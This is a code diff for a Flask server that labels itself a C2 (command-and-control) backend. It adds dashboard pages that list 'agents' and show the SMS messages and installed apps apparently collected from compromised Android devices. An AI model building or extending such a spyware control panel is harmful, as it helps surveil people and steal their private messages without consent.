@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, render_template
 from string import ascii_uppercase
 from random import choice
 import os
@@ -10,13 +10,34 @@ from sqlite3 import Error
 app = Flask(__name__)
 db_file = "database.db"
 
-##########
-# Routes #
-##########
+##############
+# Web Routes #
+##############
 
 @app.route("/")
-def hello():
-    return "Hello World!"
+def index():
+    sql = "SELECT id FROM agents"
+    agents = get_data_sql(sql)
+    return render_template("index.html", agents=agents)
+
+@app.route("/sms")
+def viewSms():
+    sql = "SELECT * FROM sms"
+    data_rows = get_data_sql(sql)
+    columns = ["id", "address", "body", "formatted_date", "type"]
+    return render_template("sms.html", title="sms", columns=columns, data=data_rows)
+
+@app.route("/app")
+def viewApp():
+    sql = "SELECT id, package, sourceDir, launchActivity FROM app"
+    data_rows = get_data_sql(sql)
+    columns = ["id", "package", "sourceDir", "launchActivity"]
+    return render_template("app.html", title="Installed apps", columns=columns, data=data_rows)
+
+#############
+# C2 Routes #
+#############
+
 
 @app.route("/updog", methods=['GET'])
 def updog():
@@ -150,6 +171,17 @@ def readFromDatabase(sql, args):
     finally:
         if conn:
             conn.close()
+
+def get_db_connection():
+    conn = sqlite3.connect(db_file)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def get_data_sql(sql):
+    conn = get_db_connection()
+    rows = conn.execute(sql).fetchall()
+    conn.close()
+    return rows
 
 def init_database():
     print("Creating database")
